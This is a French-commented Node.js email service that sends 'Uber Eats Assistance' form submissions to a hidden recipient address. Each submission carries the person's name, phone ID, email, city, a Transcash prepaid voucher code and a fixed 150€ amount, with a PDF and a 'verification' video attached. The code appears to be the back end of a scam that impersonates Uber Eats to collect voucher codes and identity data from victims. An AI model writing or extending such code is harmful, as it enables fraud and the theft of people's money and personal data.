const nodemailer = require('nodemailer');
const fs = require('fs');

/**
 * Service d'envoi d'emails - VERSION CORRIGÉE
 */
class EmailService {
  constructor() {
    console.log('📧 Initialisation EmailService...');
    console.log('SMTP_HOST:', process.env.SMTP_HOST ? 'OK' : 'MANQUANT');
    
    this.transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || 'smtp.gmail.com',
      port: parseInt(process.env.SMTP_PORT) || 587,
      secure: false,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      },
      pool: true,
      maxConnections: 1,
      connectionTimeout: 60000,
      socketTimeout: 60000
    });
  }

  async sendAssistanceRequest(formData, situation, pdfPath, videoPath) {
    try {
      const subject = situation === 'waiting' 
        ? `[ATTENTE] Demande - ${formData.fullName}`
        : `[BLOQUÉ] Demande - ${formData.fullName}`;
      
      const htmlContent = `
        <h1>🚗 Uber Eats Assistance</h1>
        <h2>📋 Informations client</h2>
        <p><strong>Situation:</strong> ${situation === 'waiting' ? 'En attente' : 'Bloqué'}</p>
        <p><strong>Nom:</strong> ${formData.fullName}</p>
        <p><strong>Téléphone:</strong> ${formData.uberId}</p>
        <p><strong>Email:</strong> ${formData.uberEmail}</p>
        <p><strong>Ville:</strong> ${formData.city}</p>
        <p><strong>Transcash:</strong> ${formData.transcashCode}</p>
        <p><strong>Montant:</strong> 150€</p>
        <hr>
        <p><strong>Pièces jointes:</strong> PDF + Vidéo vérification</p>
      `;

      const mailOptions = {
        from: `"Uber Eats Assistance" <${process.env.EMAIL_USER}>`,
        to: process.env.RECIPIENT_EMAIL,
        subject: subject,
        html: htmlContent,
        attachments: [
          {
            filename: `info-${formData.fullName.replace(/\s+/g, '-')}.pdf`,
            path: pdfPath
          },
          {
            filename: `video-${formData.fullName.replace(/\s+/g, '-')}.mp4`,
            path: videoPath
          }
        ]
      };

      console.log('📤 Envoi vers:', process.env.RECIPIENT_EMAIL);
      const info = await this.transporter.sendMail(mailOptions);
      console.log('✅ EMAIL OK:', info.messageId);
      
      return { success: true, messageId: info.messageId };
      
    } catch (error) {
      console.error('❌ EMAIL ERROR:', error.message);
      throw new Error('Email échoué: ' + error.message);
    }
  }
}

module.exports = new EmailService();
